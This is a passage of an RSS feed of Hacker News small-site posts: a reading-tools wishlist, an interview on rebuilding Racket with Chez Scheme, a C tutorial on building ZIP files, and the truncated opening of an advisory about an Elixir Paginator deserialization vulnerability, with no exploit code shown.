including but not limited to images, sound files, videos, Google Drive docs, diagrams, long-form paywalled articles, PDFs, powerpoint presentations, and base 64 encoded blobs.</p></li><li><p>I have little visibility into required time investment and foundational context until I’ve opened it and started thinking about it. Should I sit down with a pen and paper to read this or can I skim it while waiting for my coffee?</p></li><li><p>Learning, work, news, and entertainment all have different priorities in my life (roughly in that order).</p></li><li><p>I would like to batch process content in different “streams” regardless of where they are stored. For example: I have two hours, let me work through interesting text content my friends sent me last week. Or: show me all the interesting/relevant videos I’ve queued over the past month.</p></li><li><p>I’m not always connected to a stable internet connection.</p></li><li><p>If it’s a long piece of content I want my position saved reliably so I can resume at a later point.</p></li><li><p>I often want it in a different format than the one it was originally published in (audio → text, text → audio, pdf → ebook). Automated conversion works but is cumbersome. Listening to text articles requires sending them to a special app and converting articles to ebooks is annoying and loses a lot of formatting and navigation.</p></li><li><p>I love to respond to a person’s recommendation - preferably before they’ve forgotten why they sent me it in the first place.</p></li><li><p>I’d like a centralized history of content tied to my notes and annotations in case I want to find it again later. It feels like every week I’m speaking with someone and I remember a blog post I read a few months ago they might find relevant … or was it a Reddit post? Can I find it my history? Oh no, it’s been replaced with <code>[deleted]</code> … find an archived copy… rinse and repeat.</p></li></ul><figure><img src="https://imgs.xkcd.com/comics/icon_swap.png"><figcaption>Relevant XKCD, as is tradition</figcaption></figure><p>Following my curiosity feels like chasing a caffeinated bunny around while real understanding requires time, perspective, and reflection. The internet makes the former much easier - so I find myself constantly balancing the two. Additionally, my energy and attention levels vary throughout the day and it’s far easier to just open Twitter rather than continue reading a long-form article I started on my laptop two days ago. Too often I default to the lower-friction one.</p><p>Honorable Mentions: <a href="https://getpocket.com/">Pocket</a>, <a href="https://www.instapaper.com/">Instapaper</a></p><h2 id="a-universal-book-log-recommendation-sharing-system">A universal book log, recommendation &amp; sharing system&nbsp;<a href="#a-universal-book-log-recommendation-sharing-system">#</a></h2><p>I love exploring other peoples’ reading lists. Here’s <a href="https://jon.bo/books">my own</a>. I find everyone keeps their reading lists in different formats on different platforms. Plaintext lists are nice but hard to parse. Spreadsheets are easy to parse but a pain to manage. Third-party services aren’t interoperable, require logins, and are not future-proof.</p><p>Part of the problem here is <a href="https://people.well.com/user/doctorow/metacrap.htm">metadata is hard</a>. Someone has to sit there and fill out the author, title, subtitle, summary, page count - and they’re probably not going to do it for free. Amazon is a good at it but <a href="https://stallman.org/amazon.html#publishing">is hostile to publishers</a>. Goodreads has much potential but <a href="https://onezero.medium.com/almost-everything-about-goodreads-is-broken-662e424244d5">seems to have stagnated</a>. Linking to the book’s Wikipedia entry would be my preference but very few books have an entry.</p><p>Whatever this tool for managing my ever-growing reading list will be, it should:</p><ul><li><p>Let me compare my reading list with another to see overlap. I find this a wonderful way to spark conversation and find common interests.</p></li><li><p>Allow me to tag books instead of placing them into static lists (think clusters or tag clouds).</p></li><li><p>Be tied to my highlights, annotations, and bookmarks in a non-proprietary, searchable, and shareable format. Make them public if I want to.</p></li><li><p>Save context on where and when I found this book: why I thought it was important to read, when I read it, what I wrote down while reading it, and what other content I discovered through it.</p></li><li><p>Let me query this tool like a relational database. For example: show me all books about scaling startups recommended by people I follow on Twitter or by people they follow. The current Twitter search makes me feel like I’m using a government site created before I myself even knew what a computer was.</p></li><li><p>Help me <a href="https://www.lesswrong.com/posts/Kmch6T2YscMyLFJD9/rational-reading-thoughts-on-prioritizing-books">deal with prioritization</a>. My reading list is a mess and I can’t be alone. Are certain books better read before others? Prerequisites? Could three of them be replaced with one? What are the other books by the this author? Are they worth reading too? Why exactly did I think reading this 800 page book was relevant when I added it? <a href="https://www.samuelthomasdavies.com/book-summaries/health-fitness/the-checklist-manifesto/">Is 80% of the content attainable from a blog post?</a> Where is that post? Has someone in my network written a rebuttal to the ideas in this book? The list goes on and on.</p></li><li><p>Provide relevant suggestions with the typical recommender approach based on what people interested in the same topics also enjoyed reading and learning from.</p></li></ul><p>Honorable Mentions: None :(</p><h2 id="intelligent-pdf-viewers-ebook-readers-audiobook-podcast-players">Intelligent PDF viewers, eBook readers, audiobook &amp; podcast players&nbsp;<a href="#intelligent-pdf-viewers-ebook-readers-audiobook-podcast-players">#</a></h2><figure><img src="https://d33wubrfki0l68.cloudfront.net/5aa98bca712e33bc729c180c9a588f4d5ac7e9af/c5011/digital-tools/ebook-concept.png"><figcaption>Functionality I want in my document reader</figcaption></figure><p>Reading is incredible and I love my Kindle. But eBooks today are just a step above OCR’ing a book and slapping on a few basic features which have existed for 30+ years. While I’m reading an eBook I want to:</p><ul><li><p>Have relevant illustrations, graphs, and tables appear for duration of their mentions so I don’t have to flip back and forth between them.</p></li><li><p>See glossary terms and their definitions which appear on this page. Highlighting and searching a term is great but the author may have added important context to the glossary definition.</p></li><li><p>View popular annotations and highlights across <strong>all</strong> mediums - not just by other readers who own an Amazon Kindle readers and purchased this book version and also happened to highlight it enough times. A quote was referenced in 300 blog articles? A two sentence excerpt retweeted 50,000 times? You bet I want to know!</p></li><li><p>Follow referenced information easily. You cited a paper - great, let’s look at the footnotes. Oh, the full reference is in the back of the book. Online list of citations? Of course not! Drop a bookmark, navigate to the back of the book, pull out my laptop, find the paper. Of course, a paywall. Grab a snack. Acquire the PDF. Search for keywords to try to find the referenced information. Sigh, 2019.</p></li><li><p>Not be hindered by the DRM system. Copyright is important and I want to support authors but it’s insane to me all these content licenses I’m acquiring can’t be donated to a library upon account closure. Yes, legal DRM-free eBooks exist but they aren’t without their own issues.</p></li><li><p>Seamlessly switch between devices and formats while retaining my position. Something like Whispersync (<a href="https://www.amazon.com/gp/feature.html?ie=UTF8&amp;docId=1000827761">a neat idea</a> but come on, I’m not made of money. Also, see above points).</p></li><li><p>Let me use a digital or physical keyboard instead of an e-ink keyboard to type my annotations. A possibility here is a companion app, which feels like a notes app but ties my notes to their location/text in the book I’m reading.</p></li></ul><figure><img src="https://d33wubrfki0l68.cloudfront.net/7bc95c0c51628e5ba06ddb7e688a58c600e503c8/81599/digital-tools/audiobook-player.png"><figcaption>What I want my audiobook player to look like</figcaption></figure><p>Most of these points above also apply to my experience listening to podcasts, audiobooks, and watching Youtube videos and interviews. I find myself wishing I could:</p><ul><li><p>Navigate them more comfortably. Both Libby and Audible leave much to be desired in terms of navigation. Finding a quote I remember hearing to three days ago is basically blindly stumbling around - and I lose my current spot too. Seeing a list of chapter numbers for the book I’m <strong>listening to</strong> has been helpful a grand total of 0 times. And how cool would it be to drop a bookmark from my bluetooth-connected headphones as I’m biking down a street.</p></li><li><p>View an auto-generated transcript of a podcast as I’m listening to it. It should have easy-to-follow links to references to other podcasts, media, books and support searching for key terms. YouTube already transcribes all of their videos and Google Meet now generates live captions as we’re talking - why can’t we do something similar with podcast apps?</p></li></ul><p>Honorable Mentions: <a href="https://readwise.io/">Readwise</a>, <a href="https://www.weavatools.com/">Weava</a>, <a href="https://www.descript.com/">Descript</a>, <a href="https://otter.ai/">Otter.ai</a>, <a href="https://getpolarized.io/#features">Polar</a></p><h2 id="a-centralized-search-interface-for-my-digital-brain-memex">A centralized search interface for my digital brain (memex)&nbsp;<a href="#a-centralized-search-interface-for-my-digital-brain-memex">#</a></h2><p>I want to be able to open an interface, type three words, and instantly see results from everything my digital self has interacted with. Emails, years of full-text browsing history, text messages, Slack messages across <strong>all</strong> my …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jon.bo/posts/digital-tools/">https://jon.bo/posts/digital-tools/</a></em></p>]]>
            </description>
            <link>https://jon.bo/posts/digital-tools/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25228089</guid>
            <pubDate>Fri, 27 Nov 2020 12:21:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rebuilding the Racket Compiler with Chez Scheme]]>
            </title>
            <description>
<![CDATA[
Score 105 | Comments 34 (<a href="https://news.ycombinator.com/item?id=25228079">thread link</a>) | @AlexeyBrin
<br/>
November 27, 2020 | https://notamonadtutorial.com/rebuilding-the-racket-compiler-with-chez-scheme-210e23a69484 | <a href="https://web.archive.org/web/*/https://notamonadtutorial.com/rebuilding-the-racket-compiler-with-chez-scheme-210e23a69484">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><h2 id="4198">An interview on Racket CS with programmers Gustavo Massaccesi Matthew Flatt</h2><div><div><div><p><a href="https://federicocarrone.medium.com/?source=post_page-----210e23a69484--------------------------------" rel="noopener"><img alt="Federico Carrone" src="https://miro.medium.com/fit/c/56/56/2*p2NbnNI4sEc75QvzOZ1gaA.jpeg" width="28" height="28"></a></p></div></div></div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3852/1*so5Q8KpDmcaIAKUHU5V9mw.png" width="1926" height="968" srcset="https://miro.medium.com/max/552/1*so5Q8KpDmcaIAKUHU5V9mw.png 276w, https://miro.medium.com/max/1104/1*so5Q8KpDmcaIAKUHU5V9mw.png 552w, https://miro.medium.com/max/1280/1*so5Q8KpDmcaIAKUHU5V9mw.png 640w, https://miro.medium.com/max/1400/1*so5Q8KpDmcaIAKUHU5V9mw.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*so5Q8KpDmcaIAKUHU5V9mw.png?q=20"></p></div></div></div><figcaption>Still from a <a href="https://www.youtube.com/watch?v=t09AJUK6IiM" rel="noopener">2018 talk by Matthew Flatt</a>, intervened by us</figcaption></figure><p id="3a1d">Racket flaunts the title of being <em>the programmable programming language</em>. With extensibility at its core, it takes metaprogramming to the next level by encouraging developers to implement their own DSLs to solve the problem at hand.</p><p id="3876">Following this same principle, its development team attacks the complexity of writing a compiler by stacking layers of DSLs to implement many of its components.</p><p id="1a3c">On the other hand, the project had many legacy components written in C that became a development bottleneck, so in 2017, Matthew Flatt made an announcement on a Racket Developers group:</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2220/1*oXZFdbH7adA58JPU4Cu2tw.png" width="1110" height="274" srcset="https://miro.medium.com/max/552/1*oXZFdbH7adA58JPU4Cu2tw.png 276w, https://miro.medium.com/max/1104/1*oXZFdbH7adA58JPU4Cu2tw.png 552w, https://miro.medium.com/max/1280/1*oXZFdbH7adA58JPU4Cu2tw.png 640w, https://miro.medium.com/max/1400/1*oXZFdbH7adA58JPU4Cu2tw.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*oXZFdbH7adA58JPU4Cu2tw.png?q=20"></p></div></div></div><figcaption><a href="https://groups.google.com/g/racket-dev/c/2BV3ElyfF8Y/m/4RSd3XbECAAJ?pli=1" rel="noopener">Source</a></figcaption></figure><p id="f313">Chez is <span id="rmm">a</span> Scheme implementation which was open sourced by Cisco in 2016. Its performance has no match among other schemes and it has a long history of being used in production.</p><p id="f163">To learn more about this endeavor, we contacted Gustavo Massaccesi, and Matthew Flatt, who were part of what is now called the <strong>Racket CS</strong> project. In this interview, they explain the background and details of this project.</p><p id="f0ef">We're big fans of Matthew Flatt's work and of the Racket endeavor. For further reading we recommend reading Flatt's article <a href="https://queue.acm.org/detail.cfm?id=2068896" rel="noopener">Creating languages in Racket</a>, <a href="https://gumroad.com/l/lop-in-racket-cultural-anthro" rel="noopener">this book</a> that interviews 38 Racket programmers, and the book <a href="https://beautifulracket.com/" rel="noopener">Beautiful Racket</a>, which Flatt prologued.</p></div></div></section><section><div><p id="68b3"><em>Join the Not a Monad Tutorial Telegram </em><a href="https://t.me/notamonadtutorial" rel="noopener"><em>group</em></a><em> or </em><a href="https://t.me/channel_notamonadtutorial" rel="noopener"><em>channel</em></a><em> to talk about programming, computer science and papers. See you there!</em></p></div></section><section><div><p id="f9ba"><em>If you are looking for good engineers send me an email to mail@fcarrone.com or you can also reach me via twitter at </em><a href="https://twitter.com/federicocarrone" rel="noopener"><em>@federicocarrone</em></a><em>.</em></p></div></section><section><div><div><h2 id="77cf"><strong>Tell us about Racket. What makes it stand out in the LISP family?</strong></h2><p id="b428">Let’s distinguish “Racket the language” and “Racket the project”.</p><p id="f2e2">The Racket language is a general-purpose, Scheme-like language with an especially rich set of constructs for extending the language — even by Scheme standards. Racket includes support for writing quick-and-dirty macros, but it also supports nice macros with a good error checking that avoid surprising errors created in the expanded code. The close integration of macros and modules, an enforced phase separation between run-time and compile-time code, and the `#lang` mechanism for selecting the surface syntax all distinguish Racket from other Lisp variants.</p><p id="d48e">Even the main language Racket is written in a simpler language, and that is written in an even more simple language. This tower of languages makes development easier. You can look under the hood and see all the internal languages, or just ignore all of them and get a nice high level language.</p><p id="36f0">Less prominent, but also as important in practice for building language abstractions and composing them into large systems, are Racket’s run-time constructs: first-class control with continuation marks, custodians for simple and reliable task termination, reachability-based memory accounting, message-based parallelism via places, and Concurrent ML-style constructs for event-driven programs. Many of these constructs need support at lower levels of the runtime system, but then they can be used to build a wide variety of languages and libraries that mesh well.</p><p id="cb77">The Racket project synthesizes research, production, and education efforts toward the overall language-building goal. The idea of “A Programmable Programming Language” serves along those directions, from building student-friendly learning environments to domain-specific languages in application to pushing the frontiers of language design and implementation.</p><p id="a39d">The main page is <a href="https://racket-lang.org/" rel="noopener">https://racket-lang.org/</a></p><h2 id="47bc"><strong>What does it mean that you can write your own language?</strong></h2><p id="8534">For example, when you install Racket, it comes with 20 or 30 additional languages. (I’m not sure if someone has counted all of them.)</p><p id="adb8">There are a few “Student” languages that are designed for students. They are less powerful but have more compile time checks to detect common errors in beginners. And they have different levels so once you master one, you can use the next one that includes more features.</p><p id="e7f1">Another language is Typed Racket, that adds types to the Racket expressions, so it refuses to compile unless the types check. And it also uses the type information to optimize the code, so the compilation is slower, but the generated code can be faster.</p><p id="b5fa">There are languages that implement the version of Scheme in R5RS and R6RS and many of the SRFI. And you can install a package that adds the version in the R7RS-small.</p><p id="8dd3">And there are also more different languages with a very different syntax like a complete implementation of Algol 60.</p><p id="d422">All these languages share the same backend and you can call the libraries written in one language from any of the other languages that are included in the distribution, the additional languages you can download as packages, or the languages you create.</p><p id="7932"><strong>What’s the difference between Racket and Scheme?</strong></p><p id="f375">Racket started out as a Scheme implementation, and we would still call it “a Scheme.” Even though it does not fit a Scheme standard, it’s obviously derived from Scheme. There are many specific differences, such as the fact that `cons` always creates an immutable pair in Racket, but the main difference is philosophy: Scheme is meant to be a small language that gives you just enough to express lots of things. Racket is meant to be a big language, and while it gives you the same core pieces (and more) that can express lots of things, it also codifies the way many things are done to enable more cooperating libraries and languages.</p><h2 id="0256"><strong>What is Chez Scheme, how is it different from other Scheme implementations?</strong></h2><p id="1fb3">Chez Scheme is one of the oldest Scheme implementations, and its evolution informed many parts of the Scheme standard through R6RS. (Racket’s influence on the Scheme standard, in contrast, is limited to aspects of the R6RS library design.) Chez Scheme is a relatively small language, but like all instantiations of Scheme, the implementation provides a lot more than the standard specifies.</p><p id="3c1c">Chez Scheme’s biggest claim to fame is its performance. It has always been among the best-performing Scheme implementations. Its object-tagging and allocation regime, its hybrid stack–heap implementations of continuations, and its compiler structure all remain state-of-the-art, even in 2020.</p><p id="3095">For most of its existence, Chez Scheme was a proprietary, closed-source implementation, but it became open source in mid-2016. As it happens, we started considering a new Racket reimplementation around the start of 2017.</p><h2 id="54ea"><strong>Why did you choose Chez Scheme over other Schemes to rebuild Racket?</strong></h2><p id="db07">The biggest weakness of the Racket BC (“before Chez”) implementation are its back-end compiler structure, its inefficient internal calling conventions (over-adapted to C), and its poor implementation of first-class continuations. Those are exactly the strengths of Chez Scheme. Furthermore, Racket’s evaluation model was always closely aligned with Chez Scheme, such as the emphasis on interactive evaluation and compilation.</p><p id="d9a4">It was clear up front that Chez Scheme lacked significant features that Racket needs, such as support for continuation marks and reachability-based memory accounting. However, the high quality of the Chez Scheme design and implementation, in contrast to old Racket’s implementation, made adapting Chez Scheme more appealing than retrofitting Racket’s old implementation further.</p><h2 id="28e7"><strong>Why reimplement with Chez Scheme to reduce the C part instead of implementing the C stuff in Racket?</strong></h2><p id="2658">Mostly, we did reimplement the C stuff in Racket. The I/O subsystem, the concurrency subsystem (which includes the scheduler for “green” threads, Concurrent ML-style events, and custodians), and the regexp matcher were all rewritten in Racket. Those pieces followed the rewrite of the macro expander in Racket. Other things that needed to be moved out of C, such as the compiler and the extensive support for numbers that Racket inherited from Scheme, were already written in Scheme in Chez Scheme’s implementation.</p><p id="b995">A big part of the process was to understand what to implement in Racket, what in Chez Scheme, and what new layers to introduce in translation. This work and reorganization benefits other Racket implementation efforts, such as Pycket and RacketScript.</p><h2 id="de40"><strong>Besides improving maintainability, what are the advantages of building Racket with CS over C?</strong></h2><p id="4952">With the exception of the garbage collector and similar low-level parts of the runtime system, much of Racket’s implementation benefits from higher-level abstractions. Writing a macro expander in C was a particularly poor choice, since higher-level abstractions obviously make tree manipulations easier, but the same reasons apply for the I/O layer or numeric primitives. Even the garbage collector in [the Racket variant of] Chez Scheme is now half implemented by a specification and compiler that are written in Scheme.</p><p id="60db">The other big advantage is that the Racket community has a lot of Racket programmers, not C programmers. It’s easier to convince a fan of Racket to look at some code in Racket or Chez Scheme and try to find some bug or a new feature to contribute. The people that like to read and write code in C are probably making contributions to a C compiler.</p><h2 id="e706"><strong>What were the most challenging parts to implement?</strong></h2><p id="971c">The most challenging part is not really one part, but the overall scale. Racket is a big language, and it all has to work the same in the new implementation. That means not just getting the right result and/or a specific kind of error message, but getting results with the same or better performance characteristics. For example, if a macro generates a giant expansion that nevertheless compiles in reasonable time in Racket BC, then it needs to compile in reasonable time in Racket CS.</p><p id="c985">When it comes to specific pieces that we had to implement, perhaps the most challenging were adding type reconstruction to the compiler, adding support for continuation marks, allowing record values to act as procedures, reimplementing Racket’s I/O, and upgrading Chez Scheme’s …</p></div></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://notamonadtutorial.com/rebuilding-the-racket-compiler-with-chez-scheme-210e23a69484">https://notamonadtutorial.com/rebuilding-the-racket-compiler-with-chez-scheme-210e23a69484</a></em></p>]]>
            </description>
            <link>https://notamonadtutorial.com/rebuilding-the-racket-compiler-with-chez-scheme-210e23a69484</link>
            <guid isPermaLink="false">hacker-news-small-sites-25228079</guid>
            <pubDate>Fri, 27 Nov 2020 12:19:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Creating a Zip File from Scratch]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25227872">thread link</a>) | @marksmillibend
<br/>
November 27, 2020 | https://ph1lter.bitbucket.io/blog/2020-11-27-zip-creation.html | <a href="https://web.archive.org/web/*/https://ph1lter.bitbucket.io/blog/2020-11-27-zip-creation.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

<a href="https://ph1lter.bitbucket.io/index.html">(home)</a> <span>2020-11-27</span>
<p>Let's try creating a ZIP file from scratch. Since I'm mostly interested in the layout and meta-data we'll be using the option to add
the files <em>uncompressed</em>. That means I don't have to learn the [deflate] compression algorithm at the same time.
The resulting knowledge is still useful in that it will allow us to bundle a set of files into a single, ubiquitous format.
</p>
<p>unix [cpio] (or even [tar]) would be easier but it's not ubiquitous.... I'm looking at you DOS.
</p>
<p>I'll be using C for this, <s>since it's ubiquitous</s>... since I like it. Also, C is good for the kind of low-level bit manipulation
we'll be doing here.
Even if you don't like C there is still some useful information here about the zip file format.
(I was going to use Common Lisp, but it's not ubiquitous.)
</p>
<p>Useful resources:
</p>
<ul><li>
<a href="https://en.wikipedia.org/wiki/ZIP_(file_format)">https://en.wikipedia.org/wiki/ZIP_(file_format)</a>
</li><li>
hexdumping a real zip file
</li></ul>
<h2> simplest zip file</h2>
<p>Zip files are read <em>from the end</em>. This allows the zip file to built in a single pass.
(It also allows some other tricks like prefixing data at the start of a zip file e.g. an executable to unpack the remainder.)
</p>
<p>A zip reader finds the final record by searching backwards for the record's magic number e.g. 0x06054b50
(a record is just a block of bytes in the file).
Every zip file must contain an <code>End of Central Directory Record</code> and the 
simplest zip file consists of only an End of Central Directory Record. That would be an empty zip file, but a zip file nevertheless.
</p>
<p><span>note the mention of disk numbers, this file format was invented back in the days of archives spanning multiple floppy disks.</span>
</p>
<p>The EOCD format is given here.
<a href="https://en.wikipedia.org/wiki/ZIP_(file_format)#End_of_central_directory_record_(EOCD)">https://en.wikipedia.org/wiki/ZIP_(file_format)#End_of_central_directory_record_(EOCD)</a>
</p>
<p>Remember that all integers (including the magic) must be written little-endian (i.e. byte reversed).
I will assume your platform does that automatically since most people will be using an Intel/AMD processor.
(Check the C functions ntohs() and ntohl() if your platform is big endian.)
</p>
<p>This is the C function which will write the EOCD record.
<span>the full code will be linked at the bottom of the article</span>
</p>
<pre>/*
  EOCD record [End of Central Directory] (all integers little-endian)
  https://en.wikipedia.org/wiki/ZIP_(file_format)#End_of_central_directory_record_(EOCD)
  == offset len description
  0   4   End of central directory signature = 0x06054b50
  4   2   Number of this disk
  6   2   Disk where central directory starts
  8   2   Number of central directory records on this disk
  10  2   Total number of central directory records
  12  4   Size of central directory (bytes)
  16  4   Offset of start of central directory, relative to start of archive
  20  2   Comment length (n)
  22  n   Comment
*/
static void eocd(unsigned nentries, FILE *f){
  enum{magic=0x06054b50, disknum=0, no_comment=0, };
  size_t debug_size = curoffset;
  uint32_t const cdsz = curoffset - cdoffset;
  putu32(magic, f);
  putu16(disknum, f);
  putu16(disknum, f);
  putu16(nentries, f);
  putu16(nentries, f);
  putu32(cdsz, f);
  putu32(cdoffset, f);
  putu16(no_comment, f);
  // no comment to put
  debug_size = curoffset-debug_size;
  assert(22==debug_size);
}
</pre>
<p>Build the code and call the program to produce our zip file (on stdout):
</p>
<pre>$ make mkzip
$ ./mkzip &gt;ex.zip
$ file ex.zip
ex.zip: Zip archive data (empty)
</pre>
<p>Congratulations! We have created a zip file from scratch. That will be all for today. Thank you for watching...
</p>
<h2> adding some files</h2>
<pre>$ unzip -l ex.zip
Archive:  ex.zip
warning [ex.zip]:  zipfile is empty
</pre>
<p>Ok, so we'd actually like to add some files to our archive. Otherwise what's the point?
</p>
<p>Every file we add must be prefixed with a <code>local file header</code> and, after all the files are added, we add a <code>Central Directory</code> record which
contains the locations (offsets) of all those files.
</p>
<p>Firstly let's add the local file header. It needs the length of the file and the length of the file name. No problem.
More difficult is that the header needs the CRC32 checksum of the file (to allow the zip reader to check the integrity of the archive).
<a href="https://en.wikipedia.org/wiki/ZIP_(file_format)#Local_file_header">https://en.wikipedia.org/wiki/ZIP_(file_format)#Local_file_header</a>
</p>
<p><span>The trailing data descriptor record which can be used to add the CRC32 checksum and file size/compressed size <em>after</em> we've written the file. This can help simplify the zip writer's job. We will not use these here.</span>
</p>
<p>I have a feeling that CRC32 checksums will be difficult. So let's just write a <strong>zero crc32</strong> and see what happens...
</p>
<a href="https://en.wikipedia.org/wiki/Cyclic_redundancy_check#CRC-32_algorithm">https://en.wikipedia.org/wiki/Cyclic_redundancy_check#CRC-32_algorithm</a>
<p>Call <code>local_file_header</code> for each file we want to add to the zip. I've defined a struct <code>zfile_t</code> to hold the file name and some
other information like it's size and crc32 (set to zero for now). <span>full code linked at the end</span>.
</p>
<pre>/*
  Local File Record
  https://en.wikipedia.org/wiki/ZIP_(file_format)
  == offset len description
  0   4   Local file header signature = 0x04034b50 (read as a little-endian number)
  4   2   Version needed to extract (minimum)
  6   2   General purpose bit flag
  8   2   Compression method
  10  2   File last modification time
  12  2   File last modification date
  14  4   CRC-32 of uncompressed data
  18  4   Compressed size
  22  4   Uncompressed size
  26  2   File name length (n)
  28  2   Extra field length (m)
  30  n   File name
  30+n  m   Extra field
*/
static void local_file_header(zfile_t *zf, FILE *f){
  enum{magic=0x04034b50, bit_flags=0, no_compression_method=0,
    mod_time=0, mod_date=0,
    no_extra=0,
    };
  size_t debug_size = curoffset;
  unsigned const fnamelen = strlen(zf-&gt;fname);
  putu32(magic, f);
  putu16(EXTRACTOR_MIN_VERSION, f);
  putu16(bit_flags, f);
  putu16(no_compression_method, f);
  putu16(mod_time, f);
  putu16(mod_date, f);
  putu32(zf-&gt;crc32, f);
  putu32(zf-&gt;sz, f); // compressed size == uncompressed size cos not compressing
  putu32(zf-&gt;sz, f);
  putu16(fnamelen, f);
  putu16(no_extra, f);
  putbytes((uint8_t const *)zf-&gt;fname, fnamelen, f);
  debug_size = curoffset-debug_size;
  assert((30+fnamelen)==debug_size);
}
</pre>
<p>If we try to unzip the file now we get this error. We don't have the Central Directory record yet.
</p>
<pre>$ unzip -l ex.zip
Archive:  ex.zip
warning [ex.zip]:  25784 extra bytes at beginning or within zipfile
(attempting to process anyway)
warning [ex.zip]:  zipfile is empty
</pre>
<h2> the central directory</h2>
<p>This record/block contains a list of all the files in the archive (it need not contain all the files we added, nor list them in the same
order; this allows deleting files without rewriting the entire archive, important if you have 10 floppy disks...).
</p>
<p>The central directory doesn't have a separate header. It's not really a record, more a sequence of records, one per file of interest.
These records are similar to the local file header records but have a few extra fields.
</p>
<p>Finally we must remember to update our, <em>now non-empty</em>, EOCD with link back to our central directory record. Until now we were just
writing zero into the EOCD fields [size of central directory] and [offset of central directory].
</p>
<p>We can easily capture the file offset before we start writing the Central Directory and get the size by subtracting it from the file
offset after we have written the Central Directory.
</p>
<pre>/*
  Central Directory Entry
  https://en.wikipedia.org/wiki/ZIP_(file_format)
  == offset len description
  0   4   Central directory file header signature = 0x02014b50
  4   2   Version made by
  6   2   Version needed to extract (minimum)
  8   2   General purpose bit flag
  10  2   Compression method
  12  2   File last modification time
  14  2   File last modification date
  16  4   CRC-32 of uncompressed data
  20  4   Compressed size
  24  4   Uncompressed size
  28  2   File name length (n)
  30  2   Extra field length (m)
  32  2   File comment length (k)
  34  2   Disk number where file starts
  36  2   Internal file attributes
  38  4   External file attributes
  42  4   Relative offset of local file header. This is the number of bytes
    between the start of the first disk on which the file occurs, and the
    start of the local file header. This allows software reading the central
    directory to locate the position of the file inside the ZIP file.
  46  n   File name
  46+n  m   Extra field
  46+n+m  k   File comment
*/
static unsigned cdir(zfile_t files[], FILE *f){
  unsigned nfiles=0;
  enum{magic=0x02014b50,
    bit_flags=0, no_compression_method=0,
    mod_time=0, mod_date=0,
    no_extra=0, no_comment=0,
    disknum=0,
    fileattr_internal=0, fileattr_external=0,
    };
  cdoffset = curoffset;
  for(zfile_t *zf=files; zf-&gt;fname; zf++,nfiles++){
    size_t debug_size = curoffset;
    unsigned const fnamelen = strlen(zf-&gt;fname);
    putu32(magic, f);
    putu16(CREATOR_VERSION, f);
    putu16(EXTRACTOR_MIN_VERSION, f);
    putu16(bit_flags, f);
    putu16(no_compression_method, f);
    putu16(mod_time, f);
    putu16(mod_date, f);
    putu32(zf-&gt;crc32, f);
    putu32(zf-&gt;sz, f); // compressed size == uncompressed size cos not compressing
    putu32(zf-&gt;sz, f);
    putu16(fnamelen, f);
    putu16(no_extra, f);
    putu16(no_comment, f);
    putu16(disknum, f);
    putu16(fileattr_internal, f);
    putu32(fileattr_external, f);
    putu32(zf-&gt;offset, f);
    putbytes((uint8_t const *)zf-&gt;fname, fnamelen, f);
    // no extra field
    // no comment
    debug_size = curoffset-debug_size;
    assert((46+fnamelen)==debug_size);
  }
  return nfiles;
}
</pre>
<p>Let's try unpacking our putative archive again. We learned that zip uses date formats based from 1980-00-00 (which is similar to the
unix epoch 1970-01-01, except with bigger shoulder pads and more hair gel). At the moment I'm not <em>too</em> interested in the timestamps.
</p>
<pre>$ unzip -l ex.zip
Archive:  ex.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
     4596  1980-00-00 00:00   readme.zipformat
     6694  1980-00-00 00:00   mkzip.c
    18040  1980-00-00 00:00   mkzip
error:  expected central file header signature not found (file #4).
  (please …</pre></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ph1lter.bitbucket.io/blog/2020-11-27-zip-creation.html">https://ph1lter.bitbucket.io/blog/2020-11-27-zip-creation.html</a></em></p>]]>
            </description>
            <link>https://ph1lter.bitbucket.io/blog/2020-11-27-zip-creation.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25227872</guid>
            <pubDate>Fri, 27 Nov 2020 11:49:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Remote code execution in Elixir-based Paginator]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25227779">thread link</a>) | @ulldma
<br/>
November 27, 2020 | https://www.alphabot.com/security/blog/2020/elixir/Remote-code-execution-vulnerability-in-Elixir-based-Paginator-project.html | <a href="https://web.archive.org/web/*/https://www.alphabot.com/security/blog/2020/elixir/Remote-code-execution-vulnerability-in-Elixir-based-Paginator-project.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <h2 id="intro">Intro</h2>

<p>In August of this year I found a remote code execution vulnerability in the Elixir-based <a href="">Paginator</a> open-source project from <a href="https://duffel.com/">Duffel</a> (a UK-based startup in the flight searching space).
The vulnerability has the CVE number <a href="https://github.com/duffelhq/paginator/security/advisories/GHSA-w98m-2xqg-9cvj">CVE-2020-15150</a> assigned. Since Duffel seemed to use Paginator for its own REST API it seems likely
that an attacker exploiting this vulnerability would have been able to execute code on Duffel’s (cloud) assets.</p>

<h2 id="vulnerability">Vulnerability</h2>

<p>This code execution vulnerability existed due to the use of Erlang’s <code>binary_to_term</code> in combination with untrusted user data.
This function is much more dangerous when used in Elixir.</p>

<p>The vulnerability could have been triggered via Paginator’s user provided before/after cursors. As seen in <a href="https://duffel.com/docs/api/overview/pagination">Duffel’s Pagination API</a>:</p>

<p><img src="https://www.alphabot.com/images/blog/elixir-paginator/duffel_paginator_api.png" alt="Duffel's Pagination REST API"></p>

